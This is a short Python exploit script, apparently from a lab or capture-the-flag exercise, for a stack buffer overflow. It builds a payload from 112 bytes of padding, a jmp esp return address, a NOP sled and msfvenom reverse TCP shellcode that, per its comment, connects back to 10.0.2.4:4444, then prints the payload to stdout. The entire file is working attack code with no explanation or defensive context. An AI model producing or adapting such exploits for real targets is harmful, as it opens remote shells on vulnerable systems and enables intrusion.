#! /usr/bin/python

import sys

# reverse tcp shell from msfvenom
# connection to 10.0.2.4:4444

buf =  b""
buf += b"\xba\xd0\x8b\x7f\x65\xd9\xcf\xd9\x74\x24\xf4\x5d"
buf += b"\x33\xc9\xb1\x12\x83\xed\xfc\x31\x55\x0e\x03\x85"
buf += b"\x85\x9d\x90\x14\x41\x96\xb8\x05\x36\x0a\x55\xab"
buf += b"\x31\x4d\x19\xcd\x8c\x0e\xc9\x48\xbf\x30\x23\xea"
buf += b"\xf6\x37\x42\x82\x02\xc8\xb6\x56\x7b\xca\xb6\x47"
buf += b"\x27\x43\x57\xd7\xb1\x03\xc9\x44\x8d\xa7\x60\x8b"
buf += b"\x3c\x27\x20\x23\xd1\x07\xb6\xdb\x45\x77\x17\x79"
buf += b"\xff\x0e\x84\x2f\xac\x99\xaa\x7f\x59\x57\xac"

# offset = 112
pad = b'\x41' * 112

# jmp esp = 0x08049d55
eip = b'\x55\x9d\x04\x08'

# nops
nops = b"\x90" * 16

payload = pad + eip + nops + buf

sys.stdout.buffer.write(payload)

